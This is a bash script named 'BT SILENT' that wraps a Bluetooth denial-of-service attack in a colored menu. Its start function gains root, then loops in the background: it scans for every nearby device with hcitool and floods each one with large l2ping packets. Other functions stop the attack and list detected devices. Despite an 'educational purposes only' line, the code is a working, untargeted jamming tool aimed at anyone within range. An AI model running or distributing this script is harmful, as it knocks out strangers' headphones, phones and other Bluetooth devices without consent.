#!/bin/bash
RED='\e[1;31m'
GRN='\e[1;32m'
BLU='\e[1;34m'
YEL='\e[1;33m'
WHT='\e[1;37m'
CYN='\e[1;36m'
RST='\e[0m'

show_banner() {
    clear
    echo -e "${RED}=========================================================${RST}"
    echo -e "${GRN}**                                                     **${RST}"
    echo -e "${BLU}           Welcome to BT SILENT v1.0.0${RST}"
    echo ""
    figlet -f slant "BT SILENT" | lolcat --freq 0.8
    echo -e "${GRN}           Deployed by williamkreese21${RST}"
    echo ""
    echo -e "${WHT}              *      /\\      *${RST}"
    echo -e "${CYN}            *       /  \\       *${RST}"
    echo -e "${CYN}         --------/------\\--------${RST}"
    echo -e "${BLU}         |       \\      /       |${RST}"
    echo -e "${YEL}          \\_______\\    /_______/${RST}"
    echo -e "${RED}               *           *${RST}"
    echo ""
    echo -e "${GRN}**                                                     **${RST}"
    echo -e "${RED}=========================================================${RST}"
    echo ""
}

start_attack() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root privileges required!${RST}"
        sudo "$0"
        exit $?
    fi
    pkill l2ping 2>/dev/null
    echo -e "${GRN}[✓] BT SILENT STARTED SUCCESSFULLY${RST}"
    echo -e "${YEL}[*] Auto-scanning and attacking devices...${RST}"
    echo -e "${BLU}[*] Running in background${RST}"
    (
        while true; do
            DEVICES=$(hcitool scan 2>/dev/null | awk "NR>1 {print \$1}")
            for MAC in $DEVICES; do
                l2ping -i hci0 -s 600 -f "$MAC" >/dev/null 2>&1 &
            done
            sleep 10
        done
    ) >/dev/null 2>&1 & disown
    echo ""
    echo -e "${WHT}Press Enter to return to menu...${RST}"
    read -r
}

stop_attack() {
    echo -e "${YEL}[*] Stopping all attacks...${RST}"
    pkill l2ping 2>/dev/null
    pkill -f "bt-silent.sh" 2>/dev/null
    sleep 1
    echo -e "${GRN}[✓] ALL ATTACKS STOPPED${RST}"
    echo ""
    echo -e "${WHT}Press Enter to return to menu...${RST}"
    read -r
}

check_status() {
    echo -e "${BLU}[*] Checking BT SILENT status...${RST}"
    echo ""
    if pgrep l2ping >/dev/null; then
        PROCS=$(pgrep -c l2ping)
        echo -e "${GRN}[RUNNING] BT SILENT IS ACTIVE${RST}"
        echo -e "${WHT}[i] Active processes: ${PROCS}${RST}"
        echo ""
        echo -e "${YEL}[i] Detected devices:${RST}"
        hcitool scan 2>/dev/null | awk "NR>1 {print \"    → \" \$1}"
    else
        echo -e "${RED}[STOPPED] BT SILENT IS NOT RUNNING${RST}"
    fi
    echo ""
    echo -e "${WHT}Press Enter to return to menu...${RST}"
    read -r
}

show_about() {
    clear
    echo -e "${CYN}=========================================================${RST}"
    echo -e "${CYN}                BT SILENT — INFORMATION                  ${RST}"
    echo -e "${CYN}=========================================================${RST}"
    echo -e "${WHT}  Version:      1.0.0${RST}"
    echo -e "${WHT}  Deployed by:  williamkreese21${RST}"
    echo -e "${WHT}  License:      MIT${RST}"
    echo -e "${CYN}=========================================================${RST}"
    echo -e "${RED}  ⚠️  EDUCATIONAL PURPOSES ONLY${RST}"
    echo -e "${RED}  Unauthorized use is ILLEGAL${RST}"
    echo -e "${CYN}=========================================================${RST}"
    echo ""
    echo -e "${WHT}Press Enter to return to menu...${RST}"
    read -r
}

while true; do
    show_banner
    echo -e "${WHT}                    MENU OPTIONS${RST}"
    echo -e "${WHT}  ==========================================${RST}"
    echo -e "${GRN}   1.${RST} Start BT SILENT (Auto Attack)"
    echo -e "${RED}   2.${RST} Stop BT SILENT"
    echo -e "${BLU}   3.${RST} Check Status & Devices"
    echo -e "${CYN}   4.${RST} About / Credits"
    echo -e "${YEL}   0.${RST} Exit"
    echo -e "${WHT}  ==========================================${RST}"
    echo ""
    echo -ne "${WHT}  Enter your choice [0-4]: ${RST}"
    read -r CHOICE
    case "$CHOICE" in
        1) start_attack ;;
        2) stop_attack ;;
        3) check_status ;;
        4) show_about ;;
        0) echo -e "${GRN}[✓] Goodbye!${RST}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option! Please try again.${RST}"; sleep 1 ;;
    esac
done
